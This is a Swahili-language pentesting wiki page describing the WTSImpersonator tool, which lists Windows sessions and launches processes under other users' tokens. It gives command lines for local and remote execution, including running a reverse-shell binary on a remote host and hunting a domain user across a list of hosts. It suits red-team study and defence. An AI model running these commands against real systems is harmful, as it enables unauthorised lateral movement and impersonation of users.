# WTS Impersonator

{{#include ../../banners/hacktricks-training.md}}

**WTSImpersonator**, na Omri Baso, hutumia Windows Terminal Services APIs zinazofichuliwa kupitia named pipe ya RPC `\\pipe\LSM_API_service` ili kuorodhesha sessions za watumiaji walioingia na kuanzisha process kwa kutumia token ya mtumiaji aliyechaguliwa. Inasaidia kuorodhesha na kutekeleza locally, pamoja na workflows za remote zinazotegemea service.<sup>[[1]](#references)</sup>

## Utendaji wa msingi

Mtiririko wake wa local execution hutumia mfuatano ufuatao wa API:<sup>[[1]](#references)[[2]](#references)</sup>
```text
WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
```
## Modules na matumizi

- **Kuhesabu users:** Tool inaweza kuhesabu sessions kwenye host ya ndani au ya mbali.

- Kwenye host ya ndani:
```bash
.\WTSImpersonator.exe -m enum
```
- Kwenye host ya mbali, bainisha anwani ya IP au hostname:
```bash
.\WTSImpersonator.exe -m enum -s 192.168.40.131
```

- **Kutekeleza commands:** Modules za `exec` na `exec-remote` zinahitaji service context. Microsoft inaeleza kuwa `WTSQueryUserToken` inahitaji caller kuendeshwa kama `LocalSystem` akiwa na privilege ya `SE_TCB_NAME`.<sup>[[2]](#references)</sup>

- Utekelezaji wa command kwenye host ya ndani:
```bash
.\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
```
- PsExec inaweza kuanzisha command prompt ya `LocalSystem` kwa ajili ya testing:
```bash
.\PsExec64.exe -accepteula -s cmd.exe
```

- **Utekelezaji wa command kwenye host ya mbali:** Mode ya remote huunda service kwenye target kwa workflow inayofanana na PsExec, hivyo inahitaji rights za kusakinisha na kuanzisha service hiyo.<sup>[[1]](#references)</sup>

- Mfano:
```bash
.\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
```

- **Kuwasaka users:** Module ya `user-hunter` hutafuta session ya user aliyetajwa kwenye orodha ya hosts na kujaribu kutekeleza program iliyotolewa katika context hiyo.<sup>[[1]](#references)</sup>
- Mfano wa matumizi:
```bash
.\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
```

## References

- [1] [OmriBaso/WTSImpersonator](https://github.com/OmriBaso/WTSImpersonator)
- [2] [Microsoft: function ya `WTSQueryUserToken`](https://learn.microsoft.com/en-us/windows/win32/api/wtsapi32/nf-wtsapi32-wtsqueryusertoken)
{{#include ../../banners/hacktricks-training.md}}
